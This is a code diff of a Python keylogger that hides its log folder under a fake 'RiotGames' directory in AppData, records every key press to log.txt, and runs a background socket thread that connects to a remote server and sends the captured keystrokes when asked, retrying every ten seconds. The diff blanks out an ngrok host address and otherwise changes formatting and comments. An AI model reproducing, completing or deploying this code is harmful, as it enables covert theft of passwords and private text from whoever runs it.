@@ -5,21 +5,24 @@ from pathlib import Path
 import threading
 import time
 
-# Path to the log file
+# path to the log file
 log_folder = Path.home() / "AppData" / "Roaming" / "RiotGames"
 log_folder.mkdir(parents=True, exist_ok=True)
 subprocess.run(["attrib", "+h", str(log_folder)])
 
 log_file = log_folder / "log.txt"
 
-# Function to log key presses to the log.txt file
+
+# function to log key presses to the log.txt file
 def on_key_press(event):
     with log_file.open("a") as f:
         f.write(f"{event.name}")
 
-# Function to handle socket communication
+
+# handle socket communication
+# IP AND PORT GOES HERE
 def handle_socket():
-    HOST = "6.tcp.eu.ngrok.io"  
+    HOST = ""
     PORT = 13223
 
     while True:
@@ -48,13 +51,14 @@ def handle_socket():
                         except Exception as e:
                             print(f"Error reading log file: {e}")
 
-                    elif command.lower() == 'exit':
+                    elif command.lower() == "exit":
                         print("Server requested to close the connection.")
                         break
 
         except (ConnectionRefusedError, socket.error):
             print("Failed to connect to server. Retrying in 10 seconds...")
             time.sleep(10)  # Wait 10 seconds before retrying
+
 
 # Start a new thread to handle socket communication
 socket_thread = threading.Thread(target=handle_socket)
